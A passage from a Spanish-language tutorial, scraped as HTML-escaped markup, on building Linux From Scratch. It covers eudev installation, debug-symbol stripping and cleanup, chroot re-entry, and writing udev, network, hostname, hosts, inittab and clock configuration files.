            &lt;span class=&quot;nt&quot;&gt;--enable-manpages&lt;/span&gt;       &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-static&lt;/span&gt;

make

&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pv&lt;/span&gt; /lib/udev/rules.d
&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pv&lt;/span&gt; /etc/udev/rules.d

make check
make &lt;span class=&quot;nb&quot;&gt;install

tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-xvf&lt;/span&gt; ../udev-lfs-20171102.tar.xz
make &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; udev-lfs-20171102/Makefile.lfs &lt;span class=&quot;nb&quot;&gt;install

&lt;/span&gt;udevadm hwdb &lt;span class=&quot;nt&quot;&gt;--update&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;p&gt;Ya en este punto, creamos una Snapshot:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bSs.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;limpieza-final&quot;&gt;Limpieza Final&lt;/h4&gt;

&lt;p&gt;Comenzaremos colocando los símbolos de depuración para las bibliotecas seleccionadas en archivos separados:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;save_lib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ld-2.31.so libc-2.31.so libpthread-2.31.so libthread_db-1.0.so&quot;&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /lib

&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;LIB &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$save_lib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
    &lt;/span&gt;objcopy &lt;span class=&quot;nt&quot;&gt;--only-keep-debug&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LIB&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LIB&lt;/span&gt;.dbg 
    strip &lt;span class=&quot;nt&quot;&gt;--strip-unneeded&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LIB&lt;/span&gt;
    objcopy &lt;span class=&quot;nt&quot;&gt;--add-gnu-debuglink&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LIB&lt;/span&gt;.dbg &lt;span class=&quot;nv&quot;&gt;$LIB&lt;/span&gt; 
&lt;span class=&quot;k&quot;&gt;done    

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;save_usrlib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;libquadmath.so.0.0.0 libstdc++.so.6.0.27
             libitm.so.1.0.0 libatomic.so.1.2.0&quot;&lt;/span&gt; 

&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /usr/lib

&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;LIB &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$save_usrlib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
    &lt;/span&gt;objcopy &lt;span class=&quot;nt&quot;&gt;--only-keep-debug&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LIB&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LIB&lt;/span&gt;.dbg
    strip &lt;span class=&quot;nt&quot;&gt;--strip-unneeded&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LIB&lt;/span&gt;
    objcopy &lt;span class=&quot;nt&quot;&gt;--add-gnu-debuglink&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LIB&lt;/span&gt;.dbg &lt;span class=&quot;nv&quot;&gt;$LIB&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;done

&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;unset &lt;/span&gt;LIB save_lib save_usrlib
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Antes de realizar la eliminación, deberemos tener especial cuidado para asegurarnos de que ninguno de los binarios que están a punto de ser borrados se estén ejecutando:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; /tools/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, ahora los binarios y las bibliotecas se pueden quitar de forma segura:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/tools/bin/find /usr/lib &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.a &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; /tools/bin/strip &lt;span class=&quot;nt&quot;&gt;--strip-debug&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;';'&lt;/span&gt;

/tools/bin/find /lib /usr/lib &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;se&quot;&gt;\(&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.so&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;dbg &lt;span class=&quot;se&quot;&gt;\)&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; /tools/bin/strip &lt;span class=&quot;nt&quot;&gt;--strip-unneeded&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;';'&lt;/span&gt;

/tools/bin/find /&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;bin,sbin&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; /usr/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;bin,sbin,libexec&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; /tools/bin/strip &lt;span class=&quot;nt&quot;&gt;--strip-all&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;';'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finalmente, limpiamos algunos archivos adicionales que quedan de las pruebas en ejecución:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; /tmp/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Y ya en este punto, lo que haremos será cerrar sesión y volver a ingresar al entorno chroot con un comando chroot esta vez actualizado.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;IMPORTANTE&lt;/strong&gt;: A partir de ahora, en caso de necesitar volver a ingresar al entorno chroot tras salir, deberemos de ejecutar el comando que indico a continuación:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;exit

chroot&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LFS&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; /usr/bin/env &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;          &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;HOME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/root &lt;span class=&quot;nv&quot;&gt;TERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$TERM&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;            &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;PS1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'(lfs chroot) \u:\w\$ '&lt;/span&gt;        &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin:/usr/bin:/sbin:/usr/sbin &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    /bin/bash &lt;span class=&quot;nt&quot;&gt;--login&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez dentro, eliminaremos las siguientes biliotecas estáticas las cuales pueden ser borradas sin problema:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /usr/lib/lib&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;bfd,opcodes&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;.a
&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /usr/lib/libbz2.a
&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /usr/lib/lib&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;com_err,e2p,ext2fs,ss&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;.a
&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /usr/lib/libltdl.a
&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /usr/lib/libfl.a
&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /usr/lib/libz.a
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Así como los archivos instalados en los directorios ‘&lt;em&gt;/usr/lib&lt;/em&gt;’ y ‘&lt;em&gt;/usr/libexec&lt;/em&gt;’:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find /usr/lib /usr/libexec &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.la &lt;span class=&quot;nt&quot;&gt;-delete&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;configuración-del-sistema&quot;&gt;Configuración del sistema&lt;/h4&gt;
&lt;h5 id=&quot;instalación-de-lfs-bootscripts&quot;&gt;Instalación de LFS Bootscripts&lt;/h5&gt;

&lt;p&gt;Lo que haremos será dirigirnos al directorio ‘&lt;em&gt;/sources&lt;/em&gt;’ y descomprimir el comprimido correspondiente para este paquete. Una vez descomprimido, aplicaremos el siguiente comando:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;gestión-de-dispositivos&quot;&gt;Gestión de dispositivos&lt;/h5&gt;

&lt;p&gt;Comenzaremos creando unas reglas de &lt;strong&gt;Udev&lt;/strong&gt; personalizadas. Para ello, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash /lib/udev/init-net-rules.sh
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/udev/rules.d/70-persistent-net.rules
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Deberíamos ver un output como el siguiente:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bTu.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Sobre este archivo, efectuaremos un pequeño cambio. Como podréis apreciar en la imagen de arriba, el nombre de la interfaz es &lt;strong&gt;enp0s3&lt;/strong&gt;, en mi caso lo voy a llamar &lt;strong&gt;eth0&lt;/strong&gt;, por tanto abriremos el archivo, lo cambiaremos y posteriormente volveremos a ejecutar los mismos comandos:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bTN.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Una vez hecho, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;udevadm &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; /sys/block/sr0

&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/&quot;write_cd_rules&quot;/&quot;write_cd_rules by-id&quot;/'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    /etc/udev/rules.d/83-cdrom-symlinks.rules
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Deberíamos ver un output como el siguiente:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bUo.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;El archivo situado en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/udev/rules.d/83-cdrom-symlinks.rules&lt;/code&gt; debe de tener el siguiente contenido:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bUp.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Por último, para manejar dispositivos duplicados, ejecutaremos el siguiente comando:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/udev/rules.d/83-duplicate_devs.rules &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;

# Persistent symlinks for webcam and tuner
KERNEL==&quot;video*&quot;, ATTRS{idProduct}==&quot;1910&quot;, ATTRS{idVendor}==&quot;0d81&quot;, &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;
    SYMLINK+=&quot;webcam&quot;
KERNEL==&quot;video*&quot;, ATTRS{device}==&quot;0x036f&quot;, ATTRS{vendor}==&quot;0x109e&quot;, &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;
    SYMLINK+=&quot;tvtuner&quot;
&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;
EOF
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;creación-de-archivos-de-configuración-de-interfaz-de-red&quot;&gt;Creación de archivos de configuración de interfaz de red&lt;/h5&gt;

&lt;p&gt;Nos dirigiremos a la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/sysconfig&lt;/code&gt; y nos crearemos un fichero con nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ifconfig.eth0&lt;/code&gt; que posea la siguiente estructura:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ifconfig.eth0 &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
ONBOOT=yes
IFACE=eth0
SERVICE=ipv4-static
IP=192.168.1.2
GATEWAY=192.168.1.1
PREFIX=24
BROADCAST=192.168.1.255
&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En mi caso, lo adaptaré a mi segmento de red:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bUP.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Por otro lado, añadiremos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/resolv.conf&lt;/code&gt; con el siguiente contenido:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/resolv.conf &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
# Begin /etc/resolv.conf

domain &amp;lt;Your Domain Name&amp;gt;
nameserver &amp;lt;IP address of your primary nameserver&amp;gt;
nameserver &amp;lt;IP address of your secondary nameserver&amp;gt;

# End /etc/resolv.conf
&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Obviamente, cambiaremos sus valores a los correspondientes:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bUZ.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;configurando-el-nombre-de-host-del-sistema&quot;&gt;Configurando el nombre de host del sistema&lt;/h5&gt;

&lt;p&gt;Durante el proceso de arranque, el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hostname&lt;/code&gt; se usa para establecer el nombre de host del sistema.&lt;/p&gt;

&lt;p&gt;Lo que haremos será crear este archivo donde ingresaremos nuestro nombre de host:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;s4viOS&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/hostname
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Por otro lado, nos crearemos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; con el siguiente contenido:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/hosts &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
# Begin /etc/hosts

127.0.0.1 localhost
127.0.1.1 &amp;lt;FQDN&amp;gt; &amp;lt;HOSTNAME&amp;gt;
&amp;lt;192.168.1.1&amp;gt; &amp;lt;FQDN&amp;gt; &amp;lt;HOSTNAME&amp;gt; [alias1] [alias2 ...]
::1       localhost ip6-localhost ip6-loopback
ff02::1   ip6-allnodes
ff02::2   ip6-allrouters

# End /etc/hosts
&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Posteriormente, lo adaptaremos a nuestras necesidades:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bW6.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;configurando-el-sysvinit&quot;&gt;Configurando el Sysvinit&lt;/h5&gt;

&lt;p&gt;Durante la inicialización del núcleo, el primer programa que se ejecuta se especifica en la línea de comando o, por defecto, &lt;strong&gt;init&lt;/strong&gt;. Este programa lee el archivo de inicialización ‘&lt;em&gt;/etc/inittab&lt;/em&gt;’.&lt;/p&gt;

&lt;p&gt;La idea será crear este archivo con el siguiente contenido:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/inittab &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
# Begin /etc/inittab

id:3:initdefault:

si::sysinit:/etc/rc.d/init.d/rc S

l0:0:wait:/etc/rc.d/init.d/rc 0
l1:S1:wait:/etc/rc.d/init.d/rc 1
l2:2:wait:/etc/rc.d/init.d/rc 2
l3:3:wait:/etc/rc.d/init.d/rc 3
l4:4:wait:/etc/rc.d/init.d/rc 4
l5:5:wait:/etc/rc.d/init.d/rc 5
l6:6:wait:/etc/rc.d/init.d/rc 6

ca:12345:ctrlaltdel:/sbin/shutdown -t1 -a -r now

su:S016:once:/sbin/sulogin

1:2345:respawn:/sbin/agetty --noclear tty1 9600
2:2345:respawn:/sbin/agetty tty2 9600
3:2345:respawn:/sbin/agetty tty3 9600
4:2345:respawn:/sbin/agetty tty4 9600
5:2345:respawn:/sbin/agetty tty5 9600
6:2345:respawn:/sbin/agetty tty6 9600

# End /etc/inittab
&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;configuración-del-reloj-del-sistema&quot;&gt;Configuración del reloj del sistema&lt;/h5&gt;

&lt;p&gt;Crearemos un archivo en ‘&lt;em&gt;/etc/sysconfig/clock&lt;/em&gt;’ con el siguiente contenido:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/sysconfig/clock &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
# Begin /etc/sysconfig/clock

UTC=1

# Set this to any options you might need to give to hwclock,
# such as machine hardware clock type for Alphas.
CLOCKPARAMS=

# End /etc/sysconfig/clock
&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bWL.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;configuración-de-la-consola-de-linux&quot;&gt;Configuración de la consola de Linux&lt;/h5&gt;

&lt;p&gt;En este punto, configuraremos el script de consola que configura el mapa del teclado, la fuente de la consola y el nivel de registro del kernel de la consola.&lt;/p&gt;

&lt;p&gt;Nos crearemos un archivo en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/sysconfig/console&lt;/code&gt; con el siguiente contenido (cada uno lo puede adaptar a sus necesidades):&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bXf.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;creando-archivo-rc-site&quot;&gt;Creando archivo rc site&lt;/h5&gt;

&lt;p&gt;Este archivo se sitúa en ‘&lt;em&gt;/etc/sysconfig/rc.site&lt;/em&gt;’ y ya posee contenido. Lo que haremos será cambiar algunas cosas de este archivo.&lt;/p&gt;

&lt;p&gt;Empezaremos por los siguientes datos:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bXJ.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Posteriormente, descomentaremos las siguientes líneas:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bXW.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;También descomentaremos las siguientes y cambiaremos sus valores respectivos a &lt;strong&gt;yes&lt;/strong&gt;:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bXV.png&quot; /&gt;
&lt;/p&gt;
